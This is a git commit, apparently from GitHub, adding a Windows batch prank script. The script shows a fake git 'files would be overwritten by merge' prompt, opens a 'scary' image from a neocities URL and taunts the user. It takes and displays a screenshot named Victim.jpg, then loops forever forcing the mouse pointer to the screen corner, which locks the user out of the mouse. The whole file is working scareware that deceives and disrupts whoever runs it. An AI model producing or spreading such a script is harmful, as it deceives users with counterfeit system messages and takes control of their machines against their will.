ecd3f86153559a4452a6d5861bc4bc5a30093a86
Windowszin <125829699+Windowszin@users.noreply.github.com>
2023-07-15 18:55:07 -0300

    Add files via upload

---
+++ elenaoquermaisisso.bat
@@ -0,0 +1,14 @@
+title You're dead
+msg * The following untracked working tree files would be overwritten by merge. Continue?
+title Suffer. . .
+start https://dinogamer321.neocities.org/scary.jpeg
+cd res
+cd lib
+del Victim.jpg
+screenCapture Victim.jpg
+msg * Are you scared? Children. XD
+start Victim.jpg
+:a
+mouse moveTo 0x0
+goto a
+
